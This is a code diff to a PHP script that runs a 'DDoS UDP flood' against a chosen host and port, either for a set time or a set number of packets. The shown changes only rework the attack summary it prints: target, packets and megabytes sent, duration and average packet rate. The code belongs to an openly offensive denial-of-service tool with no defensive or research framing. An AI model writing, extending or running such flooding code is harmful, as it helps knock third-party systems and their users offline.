@@ -184,6 +184,7 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 				println("Sending packet #".$packets);
 			}
 		}
+		$timeStr = $exec_time. " seconds";
 	}
 	// Packet number based attack
 	else {
@@ -197,14 +198,26 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 			}
 		}
 		$exec_time = time() - $start_time;
+
+		// If the script end before 1 sec, all the packets were sent in 1 sec
+		if($exec_time==0){
+			$exec_time=1;
+			$timeStr = "less than a second";
+		}
+		else {
+			$timeStr = "about " . $exec_time . " seconds";
+		}
 	}
 	
-	// If the script end before 1 sec, all the packets were sent in 1 sec
-	if($exec_time==0){
-		$exec_time=1;
-	}
-	println("DDoS UDP flood Vs " . $host . " on port " . $port. " completed");
-	println("Completed with $packets (".round((($packets*$packet_size)/1024)/1024, 2)." MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second");
+	println();
+	println("DDoS UDP flood completed"); 
+	println('Host: ' . $host);
+	println('Port: '. $port);
+	println("Packets: " .$packets .'/'.round((($packets*$packet_size)/1024)/1024, 2). ' MB');
+	println("Duration: " .$timeStr);
+	println("Avarage: " . round($packets/$exec_time, 2).' packet/second');
+	println();
+	exit;
 	
 }
 else { 
